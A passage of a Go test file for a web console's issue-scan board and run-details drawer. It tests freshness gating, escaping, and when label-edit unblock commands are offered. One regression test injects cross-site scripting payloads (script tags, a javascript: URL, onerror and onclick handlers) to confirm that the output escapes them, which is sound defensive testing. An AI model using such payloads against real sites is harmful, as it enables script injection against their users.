package graph

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"
	"time"
)

// freshHiveCivilizationAssemblyProjectionFixture returns
// hiveCivilizationAssemblyProjectionFixture (graph/handlers_test.go) with its
// baked-in generated_at ("2026-06-23T09:30:00Z", which renders FreshnessStale
// against any realistic test clock) rewritten to now. Unblock hints/commands
// are gated to FreshnessCurrent only (buildConsoleIssueScan), so tests that
// assert real gh-command rendering must serve a fixture that lands current,
// not the shared fixture's stale timestamp.
func freshHiveCivilizationAssemblyProjectionFixture() string {
	const staleGeneratedAt = `"generated_at": "2026-06-23T09:30:00Z"`
	freshGeneratedAt := fmt.Sprintf(`"generated_at": %q`, time.Now().UTC().Format(time.RFC3339))
	replaced := strings.Replace(hiveCivilizationAssemblyProjectionFixture, staleGeneratedAt, freshGeneratedAt, 1)
	if replaced == hiveCivilizationAssemblyProjectionFixture {
		panic("freshHiveCivilizationAssemblyProjectionFixture: staleGeneratedAt marker not found in fixture; fixture format changed")
	}
	return replaced
}

func TestConsoleIssueScanCardAgentsCombinesAssignedAndTouching(t *testing.T) {
	// Assigned + touching are both surfaced (deduped, assigned first) so a
	// touching-only worker is not hidden behind the assignee; empty → unassigned.
	card := OpsCivilizationIssueScanKanbanCard{
		AssignedAgentIDs: []string{"agent_reviewer"},
		TouchingAgentIDs: []string{"agent_blocker_repair", "agent_reviewer"},
	}
	if got := consoleIssueScanCardAgents(card); got != "agent_reviewer, agent_blocker_repair" {
		t.Errorf("agents = %q, want assigned-first + touching-only, deduped", got)
	}
	if got := consoleIssueScanCardAgents(OpsCivilizationIssueScanKanbanCard{}); got != "unassigned" {
		t.Errorf("no agents = %q, want unassigned", got)
	}
	touchingOnly := OpsCivilizationIssueScanKanbanCard{TouchingAgentIDs: []string{"agent_x"}}
	if got := consoleIssueScanCardAgents(touchingOnly); got != "agent_x" {
		t.Errorf("touching-only = %q, want agent_x", got)
	}
}

func TestConsoleIssueScanCardURLRoundTripsMetacharacters(t *testing.T) {
	// A projected run/stage id with query metacharacters must round-trip
	// through the drawer URL exactly, or clicking the card opens the wrong
	// (or not-found) drawer. This guards the query-escaping in the builder
	// against the handler's r.URL.Query().Get decode.
	card := OpsCivilizationIssueScanKanbanCard{
		RunID:   "run+a&b#c=d",
		StageID: "stage a/b&x",
	}
	u, err := url.Parse(consoleIssueScanCardURL(card))
	if err != nil {
		t.Fatalf("parse drawer url: %v", err)
	}
	q := u.Query()
	if got := q.Get("run"); got != card.RunID {
		t.Errorf("run round-trip = %q, want %q", got, card.RunID)
	}
	if got := q.Get("stage"); got != card.StageID {
		t.Errorf("stage round-trip = %q, want %q", got, card.StageID)
	}
}

func TestConsoleIntakeCardDrawerHiddenWhenSurfaceUnavailable(t *testing.T) {
	// A projection that passes validation and carries issue-scan records but has
	// no generated_at is FreshnessUnavailable — the board hides its cards. The
	// drawer endpoint must honor the same gate: a direct card request must NOT
	// leak run details, or honest-staleness is one HTMX call away from bypass.
	hiveSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_, _ = io.WriteString(w, `{"projection_schema_version":"1.0.0","projection_subject":"civilization_assembly","derivation_status":"complete","issue_scan_projection":{"runs":[{"run_id":"run_x","target_issue":{"repo":"transpara-ai/site","number":1}}],"stages":[{"run_id":"run_x","stage_id":"stg_x","current_state":"parked","assigned_agent_ids":["secret_agent"]}]}}`)
	}))
	defer hiveSrv.Close()
	t.Setenv("HIVE_OPS_API_BASE_URL", hiveSrv.URL)

	h := newConsoleTestHandlers()
	mux := http.NewServeMux()
	h.Register(mux)

	req := httptest.NewRequest(http.MethodGet, "http://site.test/console/intake/card?run=run_x&stage=stg_x", nil)
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200", w.Code)
	}
	body := w.Body.String()
	if !strings.Contains(body, "not found") {
		t.Error("drawer must render honest not-found when the surface is unavailable")
	}
	if strings.Contains(body, "secret_agent") {
		t.Error("drawer leaked run details for an unavailable (timestamp-less) projection")
	}
}

func TestBuildConsoleIssueScanNilProjectionIsUnavailable(t *testing.T) {
	scan := buildConsoleIssueScan(nil, time.Now().UTC())
	if scan.Freshness != FreshnessUnavailable {
		t.Fatalf("freshness = %q, want unavailable", scan.Freshness)
	}
	if len(scan.Board.Columns) != 0 {
		t.Fatalf("nil projection must yield zero columns, got %d", len(scan.Board.Columns))
	}
	if len(scan.Notices) == 0 {
		t.Fatal("nil projection must carry an explicit notice")
	}
}

func TestBuildConsoleIssueScanFailedProjectionIsUnavailable(t *testing.T) {
	proj := &OpsCivilizationAssemblyProjection{
		DerivationStatus: opsCivilizationProjectionStatusFailed,
		GeneratedAt:      time.Now().UTC(), // failed sentinel carries a NON-zero timestamp
		FailureReasons:   []string{"hive civilization projection returned 503 Service Unavailable"},
	}
	scan := buildConsoleIssueScan(proj, time.Now().UTC())
	if scan.Freshness != FreshnessUnavailable {
		t.Fatalf("freshness = %q, want unavailable for failed status", scan.Freshness)
	}
	if len(scan.Notices) == 0 || !strings.Contains(scan.Notices[0], "503") {
		t.Fatalf("failed projection must surface its failure reason, got %v", scan.Notices)
	}
}

func TestBuildConsoleIssueScanZeroTimestampIsUnavailable(t *testing.T) {
	proj := &OpsCivilizationAssemblyProjection{DerivationStatus: "complete"} // GeneratedAt zero
	scan := buildConsoleIssueScan(proj, time.Now().UTC())
	if scan.Freshness != FreshnessUnavailable {
		t.Fatalf("freshness = %q, want unavailable for zero generated_at", scan.Freshness)
	}
}

func TestBuildConsoleIssueScanStaleTimestamp(t *testing.T) {
	now := time.Date(2026, 7, 1, 12, 0, 0, 0, time.UTC)
	proj := &OpsCivilizationAssemblyProjection{
		DerivationStatus: "complete",
		GeneratedAt:      now.Add(-2 * time.Minute), // older than consoleStaleWindow (30s)
	}
	scan := buildConsoleIssueScan(proj, now)
	if scan.Freshness != FreshnessStale {
		t.Fatalf("freshness = %q, want stale", scan.Freshness)
	}
}

func TestBuildConsoleIssueScanDerivationStatusAllowlistFailsClosed(t *testing.T) {
	now := time.Date(2026, 7, 1, 12, 0, 0, 0, time.UTC)
	records := OpsCivilizationIssueScanProjection{
		Runs: []OpsCivilizationIssueScanRunProjected{{
			RunID:       "run_u",
			TargetIssue: OpsCivilizationIssueRef{Repo: "transpara-ai/site", Number: 5},
		}},
	}
	// Only complete/partial are usable; every other status — including a FRESH
	// timestamp with real records — must fail closed. A denylist that only caught
	// "failed" would render these as live/stale data.
	for _, status := range []string{
		opsCivilizationProjectionStatusUnavailable,
		"some_future_status", // unknown enum value added later
		"",                   // missing status
		"COMPLETE-ish",       // near-miss must not slip through
	} {
		proj := &OpsCivilizationAssemblyProjection{
			DerivationStatus:    status,
			GeneratedAt:         now.Add(-5 * time.Second), // fresh — would be "current" if it leaked
			IssueScanProjection: records,
		}
		if scan := buildConsoleIssueScan(proj, now); scan.Freshness != FreshnessUnavailable {
			t.Errorf("derivation status %q: freshness = %q, want unavailable (fail closed)", status, scan.Freshness)
		}
	}

	// Sanity: the allowlisted statuses still render as usable data.
	for _, status := range []string{opsCivilizationProjectionStatusComplete, opsCivilizationProjectionStatusPartial} {
		proj := &OpsCivilizationAssemblyProjection{
			DerivationStatus:    status,
			GeneratedAt:         now.Add(-5 * time.Second),
			IssueScanProjection: records,
		}
		if scan := buildConsoleIssueScan(proj, now); scan.Freshness == FreshnessUnavailable {
			t.Errorf("derivation status %q: unexpectedly unavailable; complete/partial must render", status)
		}
	}
}

func TestBuildConsoleIssueScanCurrentPassesBoardThrough(t *testing.T) {
	now := time.Date(2026, 7, 1, 12, 0, 0, 0, time.UTC)
	proj := &OpsCivilizationAssemblyProjection{
		DerivationStatus: "complete",
		GeneratedAt:      now.Add(-5 * time.Second),
		IssueScanProjection: OpsCivilizationIssueScanProjection{
			Runs: []OpsCivilizationIssueScanRunProjected{{
				RunID:       "run_x",
				TargetIssue: OpsCivilizationIssueRef{Repo: "transpara-ai/site", Number: 200, Title: "Do the thing"},
			}},
		},
	}
	scan := buildConsoleIssueScan(proj, now)
	if scan.Freshness != FreshnessCurrent {
		t.Fatalf("freshness = %q, want current", scan.Freshness)
	}
	if len(scan.Board.Columns) == 0 {
		t.Fatal("a projected run must produce at least one board column")
	}
}

func TestConsoleIntakeRendersIssueScanBoard(t *testing.T) {
	hiveSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/api/hive/civilization/assembly-projection" {
			http.NotFound(w, r)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		_, _ = io.WriteString(w, hiveCivilizationAssemblyProjectionFixture)
	}))
	defer hiveSrv.Close()
	t.Setenv("HIVE_OPS_API_BASE_URL", hiveSrv.URL)

	h := newConsoleTestHandlers()
	mux := http.NewServeMux()
	h.Register(mux)

	req := httptest.NewRequest(http.MethodGet, "http://site.test/console/intake", nil)
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200; body: %s", w.Code, w.Body.String())
	}
	body := w.Body.String()
	// Issue ref, a working agent, a stage, and a blocker from the fixture.
	// agent_blocker_repair is a TOUCHING-only agent on run_docs_172; asserting it
	// proves the card surfaces touching agents, not just the assignee.
	for _, want := range []string{"transpara-ai/docs#172", "agent_reviewer", "agent_blocker_repair", "run_adversarial_review", "duplicate_chain"} {
		if !strings.Contains(body, want) {
			t.Errorf("intake board missing %q", want)
		}
	}
	// This shared fixture has NO ready_for_human card (states are parked /
	// human_action only), so the "not merged" affordance is asserted in the
	// dedicated card-render tests below, not here.
}

func TestConsoleIssueScanCardShowsProjectionSourceProvenance(t *testing.T) {
	// A ready issue-intake FALLBACK card (projection-only, not runtime evidence)
	// must surface its provenance so it cannot masquerade as a runtime lifecycle
	// card just because CurrentState is ready_for_human.
	fallback := OpsCivilizationIssueScanKanbanCard{
		CurrentState:     "ready_for_human",
		ProjectionSource: "scanner issue-intake fallback; not runtime execution or agent-touch evidence",
		TargetIssue:      OpsCivilizationIssueRef{Repo: "transpara-ai/site", Number: 9},
	}
	var buf bytes.Buffer
	if err := consoleIssueScanCard(fallback).Render(context.Background(), &buf); err != nil {
		t.Fatalf("render: %v", err)
	}
	out := buf.String()
	if !strings.Contains(out, "scanner issue-intake fallback") {
		t.Error("card must surface ProjectionSource provenance so fallback cards are distinguishable from runtime cards")
	}
	if !strings.Contains(out, "not merged") {
		t.Error("ready fallback card still shows the no-merge boundary (state is genuinely ready_for_human)")
	}
}

func TestConsoleIssueScanDrawerLinksProjectedIssueURL(t *testing.T) {
	linked := OpsCivilizationIssueScanKanbanCard{
		RunID:       "run_l",
		TargetIssue: OpsCivilizationIssueRef{Repo: "transpara-ai/site", Number: 42, URL: "https://github.com/transpara-ai/site/issues/42"},
	}
	var buf bytes.Buffer
	if err := consoleIssueScanDrawer(linked, true, consoleUnblockPlan{}, false).Render(context.Background(), &buf); err != nil {
		t.Fatalf("render: %v", err)
	}
	if !strings.Contains(buf.String(), `href="https://github.com/transpara-ai/site/issues/42"`) {
		t.Errorf("drawer must link the projected issue URL; got: %s", buf.String())
	}

	// No projected URL → plain text label, no dangling empty anchor.
	noURL := OpsCivilizationIssueScanKanbanCard{RunID: "r", TargetIssue: OpsCivilizationIssueRef{Repo: "transpara-ai/site", Number: 43}}
	var buf2 bytes.Buffer
	if err := consoleIssueScanDrawer(noURL, true, consoleUnblockPlan{}, false).Render(context.Background(), &buf2); err != nil {
		t.Fatalf("render: %v", err)
	}
	if strings.Contains(buf2.String(), "<a href") {
		t.Error("drawer must not render an issue anchor when no URL is projected")
	}
}

func TestConsoleIssueScanBoardHidesSummaryWhenUnavailable(t *testing.T) {
	// A failed/unavailable scan still carries board.Summary (e.g. "No typed
	// issue-scan projection records are present"). Rendering that above the
	// unavailable notice is a comforting default — suppress it when unavailable.
	scan := ConsoleIssueScan{
		Freshness: FreshnessUnavailable,
		Summary:   "No typed issue-scan projection records are present",
		Notices:   []string{"hive civilization projection returned 503"},
	}
	var buf bytes.Buffer
	if err := consoleIssueScan(scan).Render(context.Background(), &buf); err != nil {
		t.Fatalf("render: %v", err)
	}
	out := buf.String()
	if strings.Contains(out, "No typed issue-scan projection records are present") {
		t.Error("unavailable board must not render a comforting summary")
	}
	if !strings.Contains(out, "unavailable") || !strings.Contains(out, "503") {
		t.Error("unavailable board must render the honest unavailable notice")
	}
}

func TestConsoleIssueScanFragmentResetsDrawerUnlessCurrent(t *testing.T) {
	// The drawer can hold operator label-surgery commands (e.g. gh issue edit)
	// that are only ever offered from a verified-current projection
	// (buildConsoleIssueScan gates the unblock plan to FreshnessCurrent). So
	// any poll that reports the projection is no longer verified-current must
	// clear an open drawer, or a stale/partial/unavailable poll could leave a
	// now-invalid command sitting in the DOM, copyable. This is a class fix
	// over the whole freshness domain: allowlist the single proven-safe
	// preserve branch (current) rather than denylist known-bad states, so an
	// unrecognized/future freshness value clears the drawer too, never
	// preserves it.
	tests := []struct {
		name          string
		freshness     ConsoleFreshness
		wantDrawerOOB bool
	}{
		{
			name:          "current preserves the open drawer",
			freshness:     FreshnessCurrent,
			wantDrawerOOB: false,
		},
		{
			name:          "stale clears the open drawer",
			freshness:     FreshnessStale,
			wantDrawerOOB: true,
		},
		{
			name:          "partial clears the open drawer",
			freshness:     FreshnessPartial,
			wantDrawerOOB: true,
		},
		{
			name:          "unavailable clears the open drawer",
			freshness:     FreshnessUnavailable,
			wantDrawerOOB: true,
		},
		{
			name:          "unrecognized freshness value clears the open drawer",
			freshness:     ConsoleFreshness("some-future-state"),
			wantDrawerOOB: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			scan := ConsoleIssueScan{Freshness: tt.freshness, GeneratedAt: time.Now().UTC().Format(time.RFC3339)}
			if tt.freshness != FreshnessCurrent {
				scan.Notices = []string{"down"}
			}
			var buf bytes.Buffer
			if err := consoleIssueScanFragment(scan).Render(context.Background(), &buf); err != nil {
				t.Fatalf("render: %v", err)
			}
			out := buf.String()

			// The board surface always renders regardless of freshness.
			if !strings.Contains(out, `data-console-surface="intake"`) {
				t.Error("fragment must always render the intake board surface")
			}

			hasDrawerOOB := strings.Contains(out, "hx-swap-oob") && strings.Contains(out, `id="console-intake-drawer"`)
			if hasDrawerOOB != tt.wantDrawerOOB {
				t.Errorf("freshness=%q: drawer OOB reset present=%v, want=%v", tt.freshness, hasDrawerOOB, tt.wantDrawerOOB)
			}
		})
	}
}

func TestConsoleIssueScanCardStatesNoMergeWhenReady(t *testing.T) {
	card := OpsCivilizationIssueScanKanbanCard{
		RunID:        "run_ready",
		StageID:      "surface_ready_for_human_result_pr",
		CurrentState: "ready_for_human",
		TargetIssue:  OpsCivilizationIssueRef{Repo: "transpara-ai/site", Number: 400},
	}
	var buf bytes.Buffer
	if err := consoleIssueScanCard(card).Render(context.Background(), &buf); err != nil {
		t.Fatalf("render: %v", err)
	}
	if !strings.Contains(buf.String(), "not merged") {
		t.Error("a ready_for_human card must state the no-merge boundary")
	}
}

func TestConsoleIssueScanCardOmitsNoMergeWhenNotReady(t *testing.T) {
	card := OpsCivilizationIssueScanKanbanCard{RunID: "r", StageID: "s", CurrentState: "parked"}
	var buf bytes.Buffer
	if err := consoleIssueScanCard(card).Render(context.Background(), &buf); err != nil {
		t.Fatalf("render: %v", err)
	}
	if strings.Contains(buf.String(), "not merged") {
		t.Error("a non-ready card must not claim a no-merge boundary")
	}
}

func TestConsoleIntakeUnavailableWhenProjectionAbsent(t *testing.T) {
	t.Setenv("HIVE_OPS_API_BASE_URL", "") // no upstream configured -> nil projection

	h := newConsoleTestHandlers()
	mux := http.NewServeMux()
	h.Register(mux)

	req := httptest.NewRequest(http.MethodGet, "http://site.test/console/intake", nil)
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200; body: %s", w.Code, w.Body.String())
	}
	body := w.Body.String()
	if !strings.Contains(body, "unavailable") {
		t.Error("absent projection must render an explicit unavailable state")
	}
	// No fabricated cards from the fixture may appear.
	if strings.Contains(body, "transpara-ai/docs#172") {
		t.Error("unavailable board must not fabricate issue-scan cards")
	}
}

func TestConsoleIntakeTabEnabled(t *testing.T) {
	t.Setenv("HIVE_OPS_API_BASE_URL", "")
	h := newConsoleTestHandlers()
	mux := http.NewServeMux()
	h.Register(mux)

	req := httptest.NewRequest(http.MethodGet, "http://site.test/console/intake", nil)
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, req)

	body := w.Body.String()
	// The enabled Intake tab is an anchor to /console/intake, not a disabled span.
	if !strings.Contains(body, `href="/console/intake"`) {
		t.Error("Intake tab must be enabled (anchor to /console/intake)")
	}
}

func TestConsoleIntakeCardDrawerRendersPossessionAndLineage(t *testing.T) {
	hiveSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/api/hive/civilization/assembly-projection" {
			http.NotFound(w, r)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		_, _ = io.WriteString(w, hiveCivilizationAssemblyProjectionFixture)
	}))
	defer hiveSrv.Close()
	t.Setenv("HIVE_OPS_API_BASE_URL", hiveSrv.URL)

	h := newConsoleTestHandlers()
	mux := http.NewServeMux()
	h.Register(mux)

	// run_docs_172 / run_adversarial_review is a parked stage with agent_reviewer in the fixture.
	req := httptest.NewRequest(http.MethodGet, "http://site.test/console/intake/card?run=run_docs_172&stage=run_adversarial_review", nil)
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200; body: %s", w.Code, w.Body.String())
	}
	body := w.Body.String()
	for _, want := range []string{"agent_reviewer", "run_adversarial_review", "Run details"} {
		if !strings.Contains(body, want) {
			t.Errorf("drawer missing %q", want)
		}
	}
}

func TestConsoleIntakeCardDrawerUnknownIsHonestNotFound(t *testing.T) {
	hiveSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_, _ = io.WriteString(w, hiveCivilizationAssemblyProjectionFixture)
	}))
	defer hiveSrv.Close()
	t.Setenv("HIVE_OPS_API_BASE_URL", hiveSrv.URL)

	h := newConsoleTestHandlers()
	mux := http.NewServeMux()
	h.Register(mux)

	req := httptest.NewRequest(http.MethodGet, "http://site.test/console/intake/card?run=nope&stage=nope", nil)
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200", w.Code)
	}
	if !strings.Contains(w.Body.String(), "not found") {
		t.Error("unknown card must render an honest not-found drawer")
	}
}

// TestConsoleIntakeSurfaceEscapesHostileProjectionData is a characterization/
// regression guard for the Intake surface (Build 1 relocation of the
// issue-scan board to /console/intake). The old surface it replaced had
// exhaustive XSS/escaping tests; this closes the gap for the new one. templ's
// default `{ }` interpolation HTML-escapes everything, and this surface uses
// no templ.Raw/SafeHTML, so hostile operator-visible projection strings must
// come out escaped on both the board card and the run-details drawer.
func TestConsoleIntakeSurfaceEscapesHostileProjectionData(t *testing.T) {
	const runID = "run_hostile"
	const stageID = "stage_hostile"

	proj := &OpsCivilizationAssemblyProjection{
		DerivationStatus: "complete",
		GeneratedAt:      time.Now().UTC().Add(-5 * time.Second),
		IssueScanProjection: OpsCivilizationIssueScanProjection{
			Runs: []OpsCivilizationIssueScanRunProjected{{
				RunID: runID,
				TargetIssue: OpsCivilizationIssueRef{
					Repo:   "transpara-ai/x",
					Number: 900,
					Title:  "<script>alert('title')</script>",
					URL:    "javascript:alert('url')", // drawer renders this as a link — must be sanitized
				},
			}},
			Stages: []OpsCivilizationIssueScanStageProjected{{
				RunID:             runID,
				StageID:           stageID,
				CurrentState:      "parked",
				AuthorityBoundary: `<button onclick="x">auth</button>`,
				AssignedAgentIDs:  []string{"<img src=x onerror=y>agent"},
			}},
			Blockers: []OpsCivilizationIssueScanBlockerProjected{{
				RunID:          runID,
				StageID:        stageID,
				BlockerType:    `<form action="/hive">block</form>`,
				RequiredAction: `<form action="/hive">block</form>`,
			}},
			Lineage: []OpsCivilizationIssueScanLineageProjected{{
				RunID:         runID,
				StageID:       stageID,
				PrimaryTaskID: "<script>lineage()</script>",
			}},
		},
	}

	// Render the board.
	scan := buildConsoleIssueScan(proj, time.Now().UTC())
	var buf bytes.Buffer
	if err := consoleIssueScan(scan).Render(context.Background(), &buf); err != nil {
		t.Fatalf("render board: %v", err)
	}

	// Render the drawer for the first card produced by the same projection.
	board := opsCivilizationIssueScanKanban(proj)
	if len(board.Columns) == 0 || len(board.Columns[0].Cards) == 0 {
		t.Fatal("hostile fixture produced zero cards; fixture is wrong, not the surface")
	}
	card := board.Columns[0].Cards[0]
	var buf2 bytes.Buffer
	if err := consoleIssueScanDrawer(card, true, consoleUnblockPlan{}, false).Render(context.Background(), &buf2); err != nil {
		t.Fatalf("render drawer: %v", err)
	}

	boardOut := buf.String()
	drawerOut := buf2.String()
	combined := boardOut + drawerOut

	// Match the raw hostile payloads verbatim, not bare tag prefixes: the
	// surface's OWN chrome legitimately emits a real `<button ...>` element
	// (the clickable card) and this must not be confused with a leaked
	// hostile `<button onclick="x">`. Matching the exact injected string is
	// unambiguous — it only appears if the surface failed to escape it.
	rawHostile := []string{
		`<script>alert('title')</script>`,
		`<button onclick="x">auth</button>`,
		`<form action="/hive">block</form>`,
		"<img src=x onerror=y>agent",
		"<script>lineage()</script>",
		"javascript:alert('url')", // the drawer's issue-link href must be sanitized by templ.URL
	}
	for _, raw := range rawHostile {
		if strings.Contains(combined, raw) {
			t.Errorf("hostile raw markup %q survived escaping in the intake surface; board+drawer output leaked unescaped projection data", raw)
		}
	}

	if !strings.Contains(boardOut, "&lt;script") {
		t.Error("expected escaped form \"&lt;script\" in board output; escaping did not occur (data may have vanished instead of being escaped)")
	}
}

// End-to-end through the real handler + shared fixture: the cleanly
// label-parked run offers the exact commands; terminal-run copy present.
func TestConsoleIntakeDrawerRendersUnblockCommands(t *testing.T) {
	hiveSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_, _ = io.WriteString(w, freshHiveCivilizationAssemblyProjectionFixture())
	}))
	defer hiveSrv.Close()
	t.Setenv("HIVE_OPS_API_BASE_URL", hiveSrv.URL)

	h := newConsoleTestHandlers()
	mux := http.NewServeMux()
	h.Register(mux)

	req := httptest.NewRequest(http.MethodGet, "http://site.test/console/intake/card?run=run_docs_172_scope&stage=select_and_design_approach", nil)
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("status = %d", w.Code)
	}
	body := w.Body.String()
	for _, want := range []string{
		"gh issue edit 172 --repo transpara-ai/docs --remove-label cc:needs-human-scope --add-label cc:pr-ready",
		"A parked run is terminal.",
		"hive factory scan-issues --human YOUR_NAME --repo transpara-ai/docs",
		"--dispatch",
	} {
		if !strings.Contains(body, want) {
			t.Errorf("drawer missing %q", want)
		}
	}
	if strings.Contains(body, "protected-action boundary") {
		t.Error("protected warning rendered though no protected label is on docs#172")
	}
}

// End-to-end negative: run_site_115 has sibling blockers protected_action +
// stale_target, so the gate must refuse — no command anywhere, projected
// required action still shown. Uses the FRESH fixture (FreshnessCurrent)
// deliberately: this test asserts the sibling-blocker GATE refuses, not the
// freshness gate (which has its own dedicated coverage in
// TestConsoleIntakeStaleProjectionSuppressesUnblock). A stale fixture here
// would make the assertion trivially true for the wrong reason.
func TestConsoleIntakeDrawerNoCommandForNonLabelBlocker(t *testing.T) {
	hiveSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_, _ = io.WriteString(w, freshHiveCivilizationAssemblyProjectionFixture())
	}))
	defer hiveSrv.Close()
	t.Setenv("HIVE_OPS_API_BASE_URL", hiveSrv.URL)

	h := newConsoleTestHandlers()
	mux := http.NewServeMux()
	h.Register(mux)

	req := httptest.NewRequest(http.MethodGet, "http://site.test/console/intake/card?run=run_site_115&stage=surface_ready_for_human_result_pr", nil)
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, req)
	body := w.Body.String()
	if strings.Contains(body, "gh issue edit") {
		t.Error("gate must refuse commands for a run with a sibling non-label blocker (stale_target)")
	}
	if !strings.Contains(body, "human must authorize protected repo action") {
		t.Error("projected RequiredAction must still render when the gate refuses")
	}
}

// CFAR (codex, PR #203, P2): buildConsoleIssueScan stamped UnblockAvailable —
// and handleConsoleIntakeCard derived/rendered the plan — from ANY freshness
// other than FreshnessUnavailable, so a stale projection's out-of-date label
// snapshot could still produce exact "gh issue edit" commands. This test
// serves the shared fixture AS-IS (its baked-in generated_at is
// "2026-06-23T09:30:00Z", which is FreshnessStale against any realistic test
// clock — see freshHiveCivilizationAssemblyProjectionFixture's doc comment)
// and asserts the board still renders honestly (cards, required actions) but
// the gate suppresses every unblock hint and command.
func TestConsoleIntakeStaleProjectionSuppressesUnblock(t *testing.T) {
	hiveSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_, _ = io.WriteString(w, hiveCivilizationAssemblyProjectionFixture) // stale, deliberately unmodified
	}))
	defer hiveSrv.Close()
	t.Setenv("HIVE_OPS_API_BASE_URL", hiveSrv.URL)

	h := newConsoleTestHandlers()
	mux := http.NewServeMux()
	h.Register(mux)

	boardReq := httptest.NewRequest(http.MethodGet, "http://site.test/console/intake", nil)
	boardW := httptest.NewRecorder()
	mux.ServeHTTP(boardW, boardReq)
	if boardW.Code != http.StatusOK {
		t.Fatalf("board status = %d, want 200; body: %s", boardW.Code, boardW.Body.String())
	}
	boardBody := boardW.Body.String()
	if !strings.Contains(boardBody, "transpara-ai/docs#172") {
		t.Error("stale board must still render its cards honestly (data, not commands, is suppressed)")
	}
	if strings.Contains(boardBody, "unblock available") {
		t.Error("stale board must not render the unblock hint — the label snapshot is out of date")
	}

	drawerReq := httptest.NewRequest(http.MethodGet, "http://site.test/console/intake/card?run=run_docs_172_scope&stage=select_and_design_approach", nil)
	drawerW := httptest.NewRecorder()
	mux.ServeHTTP(drawerW, drawerReq)
	if drawerW.Code != http.StatusOK {
		t.Fatalf("drawer status = %d, want 200; body: %s", drawerW.Code, drawerW.Body.String())
	}
	drawerBody := drawerW.Body.String()
	if !strings.Contains(drawerBody, "human must clarify issue scope before runtime continues") {
		t.Error("stale drawer must still show the projected required action honestly")
	}
	if strings.Contains(drawerBody, "gh issue edit") {
		t.Error("stale drawer must NOT render a gh command — the label snapshot may be out of date")
	}
}

// Board hint appears exactly once with the shared fixture: only
// run_docs_172_scope passes the gate (run_docs_172 = duplicate_chain,
// run_site_115 = protected_action + stale_target siblings).
func TestConsoleIntakeCardUnblockHint(t *testing.T) {
	hiveSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_, _ = io.WriteString(w, freshHiveCivilizationAssemblyProjectionFixture())
	}))
	defer hiveSrv.Close()
	t.Setenv("HIVE_OPS_API_BASE_URL", hiveSrv.URL)

	h := newConsoleTestHandlers()
	mux := http.NewServeMux()
	h.Register(mux)

	req := httptest.NewRequest(http.MethodGet, "http://site.test/console/intake", nil)
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, req)
	if got := strings.Count(w.Body.String(), "unblock available"); got != 1 {
		t.Errorf("unblock hint count = %d, want exactly 1 (only run_docs_172_scope passes the gate)", got)
	}
}

// Component-level: cc:protected-action renders as its own warned command,
// never folded into the scope command.
func TestConsoleIntakeDrawerSplitsProtectedCommand(t *testing.T) {
	card := unblockCard("run-split", "needs_human_scope", []string{"cc:needs-human-scope", "cc:protected-action"})
	plan, ok := consoleIssueScanUnblockPlan(card, consoleIssueScanRunBlockerTypes(boardWith(card)))
	if !ok {
		t.Fatal("expected plan for label-parked card")
	}
	var buf bytes.Buffer
	if err := consoleIssueScanDrawer(card, true, plan, true).Render(context.Background(), &buf); err != nil {
		t.Fatalf("render: %v", err)
	}
	body := buf.String()
	for _, want := range []string{
		"gh issue edit 226 --repo transpara-ai/docs --remove-label cc:needs-human-scope --add-label cc:pr-ready",
		"gh issue edit 226 --repo transpara-ai/docs --remove-label cc:protected-action",
		"run it only if you authorize the protected action",
	} {
		if !strings.Contains(body, want) {
			t.Errorf("split drawer missing %q", want)
		}
	}
	for _, forbid := range []string{
		"--remove-label cc:needs-human-scope --remove-label cc:protected-action",
		"--remove-label cc:protected-action --add-label",
	} {
		if strings.Contains(body, forbid) {
			t.Errorf("protected removal folded into another command: %q", forbid)
		}
	}
}

func TestConsoleIntakeEmptyStateExplainsScanCycle(t *testing.T) {
	// A complete, fresh projection with zero issue-scan AND zero issue-intake
	// records is a genuinely usable-but-empty board (verified via
	// issueScanKanbanFromIssueIntakeFallback: with no issue_intake_projection
	// issues either, it returns zero columns rather than fabricating fallback
	// cards). The empty state must teach how runs get here.
	emptyProjection := fmt.Sprintf(`{
		"projection_schema_version": "1.0.0",
		"projection_subject": "civilization_assembly",
		"derivation_status": "complete",
		"generated_at": %q,
		"issue_scan_projection": {}
	}`, time.Now().UTC().Format(time.RFC3339))

	hiveSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/api/hive/civilization/assembly-projection" {
			http.NotFound(w, r)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		_, _ = io.WriteString(w, emptyProjection)
	}))
	defer hiveSrv.Close()
